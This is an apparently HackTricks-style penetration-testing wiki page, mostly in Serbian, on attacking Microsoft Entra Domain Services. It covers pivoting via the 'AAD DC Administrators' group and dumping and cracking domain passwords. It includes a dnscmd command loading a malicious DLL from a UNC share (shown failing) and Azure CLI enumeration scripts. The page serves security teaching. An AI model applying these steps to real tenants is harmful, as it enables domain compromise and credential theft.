# Az - Microsoft Entra Domain Services

{{#include ../../../banners/hacktricks-training.md}}

## Usluge domena

Microsoft Entra Domain Services omogućava postavljanje Active Directory-ja u Azure bez potrebe za upravljanjem Domain Controllers (u stvari, čak i nemate pristup njima).

Njegov glavni cilj je omogućiti pokretanje nasleđenih aplikacija u oblaku koje ne mogu koristiti moderne metode autentifikacije, ili tamo gde ne želite da upiti ka direktorijumu uvek idu nazad na on-premises AD DS okruženje.

Napomena da, da biste sinhronizovali korisnike kreirane u Entra ID (a koji nisu sinhronizovani iz drugih Active Directory-ja) u AD domain service, morate **promeniti lozinku korisnika** na novu kako bi mogla biti sinhronizovana sa novim AD-om. Zapravo, korisnik nije sinhronizovan iz Microsoft Entra ID u Domain Services dok se lozinka ne promeni.

> [!WARNING]
> Čak i ako kreirate novu Active Directory domenu, nećete moći potpuno da je upravljate (osim ako ne iskoristite neke miskonfiguracije), što znači da podrazumevano, na primer, ne možete direktno da kreirate korisnike u AD-u. Kreirate ih tako što **sinhronizujete korisnike iz Entra ID.** Možete odabrati da sinhronizujete sve korisnike (čak i one sinhronizovane iz drugih on-premise AD-ova), samo cloud korisnike (korisnike kreirane u Entra ID), ili čak da ih **više filtrirate**.

> [!NOTE]
> Generalno, zbog nedostatka fleksibilnosti u konfiguraciji nove domene i činjenice da su AD obično već on-premise, ovo nije glavna integracija između Entra ID i AD, ali je ipak interesantno znati kako je kompromitovati.

### Pivoting

Članovima generisane grupe **`AAD DC Administrators`** dodeljuju se lokalna administratorska prava na VM-ovima koji su domain-joined u managed domain (ali ne na domain controller-ima), jer su dodati u lokalnu administratorsku grupu. Članovi ove grupe takođe mogu da koriste **Remote Desktop** za daljinsko povezivanje na domain-joined VM-ove, i takođe su članovi sledećih grupa:

- **`Denied RODC Password Replication Group`**: Ova grupa specificira korisnike i grupe čije lozinke ne mogu biti keširane na RODC-ima (Read-Only Domain Controllers).
- **`Group Policy Creators Owners`**: Ova grupa omogućava članovima da kreiraju Group Policies u domenu. Međutim, njeni članovi ne mogu da primenjuju group policies na korisnike ili grupe niti da uređuju postojeće GPO-ove, tako da nije toliko interesantna u ovom okruženju.
- **`DnsAdmins`**: Ova grupa omogućava upravljanje DNS podešavanjima i bila je zloupotrebljena u prošlosti za [eskalaciju privilegija i kompromitovanje domena](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins), međutim nakon testiranja napada u ovom okruženju provereno je da je ranjivost zakrpljena:
```text
dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Imajte na umu da, kako bi se dodelila ova ovlašćenja, unutar AD-a grupa **`AAD DC Administrators`** se postavlja kao član prethodnih grupa, a takođe GPO **`AADDC Computers GPO`** dodaje sve članove domenske grupe **`AAD DC Administrators`** kao Local Administrators.

Pivoting from Entra ID to an AD created with Domain Services je jednostavno: dovoljno je dodati korisnika u grupu **`AAD DC Administrators`**, pristupiti putem RDP-a bilo kojem/svim mašinama u domenu i moći ćete da ukradete podatke i takođe **kompromitujete domen.**

Međutim, pivoting from the domain to Entra ID nije tako lako pošto ništa iz domena nije sinhronizovano u Entra ID. Ipak, uvek check-ujte metadata svih VMs koji su pridruženi, jer njihove dodeljene managed identities mogu imati zanimljiva ovlašćenja. Takođe **dump all the users passwords from the domain** i pokušajte da ih crack-ujete da biste se potom prijavili u Entra ID / Azure.

> [!NOTE]
> Napomena da su u prošlosti nađene i druge ranjivosti u ovom managed AD koje su omogućavale kompromitovanje DCs, [like this one](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). Napadač koji kompromituje DC bi vrlo lako mogao održavati persistenciju bez da Azure admins primete ili čak budu u stanju da je uklone.

### Enumeracija
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../banners/hacktricks-training.md}}
